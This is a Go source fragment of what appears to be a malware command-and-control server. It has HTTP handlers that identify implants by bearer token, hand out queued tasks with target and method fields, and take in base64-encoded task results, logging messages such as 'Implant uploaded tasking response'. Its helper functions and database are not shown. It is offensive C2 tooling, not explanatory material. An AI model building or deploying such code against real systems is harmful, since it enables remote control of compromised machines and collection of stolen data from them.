package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type Task struct {
	TASKID string
	TASK   string
	METHOD string
	TARGET string
	DATA   string
}

type Response struct {
	UUID   string
	TASKID string
	DATA   string
}

func taskserv(w http.ResponseWriter, r *http.Request) {

	reqToken := r.Header.Get("Authorization")
	splitToken := strings.Split(reqToken, "Bearer ")
	reqToken = splitToken[1]

	fmt.Println("[+] Callback recieved from: ", reqToken)

	// add encryption here

	// encode task

	retData := taskfetcher(db, reqToken)
	fmt.Fprintf(w, retData)

}

func taskresp(w http.ResponseWriter, r *http.Request) {

	reqToken := r.Header.Get("Authorization")
	splitToken := strings.Split(reqToken, "Bearer ")
	reqToken = splitToken[1]

	if err := r.ParseForm(); err != nil {

		fmt.Printf("Tasking response ParseForm() err: %v", err)
		return

	}

	var response Response
	encodedData := r.FormValue("data")
	data, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {

		fmt.Printf("Error Decoding Implant Response Info: %v", err)
		return
	}

	json.Unmarshal([]byte(data), &response)
	tid, err := strconv.Atoi(response.TASKID)
	if err != nil {

		fmt.Println("[!] Cannot convert TaskID to an int")
	}

	taskresponse(db, response.UUID, tid, response.DATA)

	fmt.Println("[+] Implant uploaded tasking response")

}
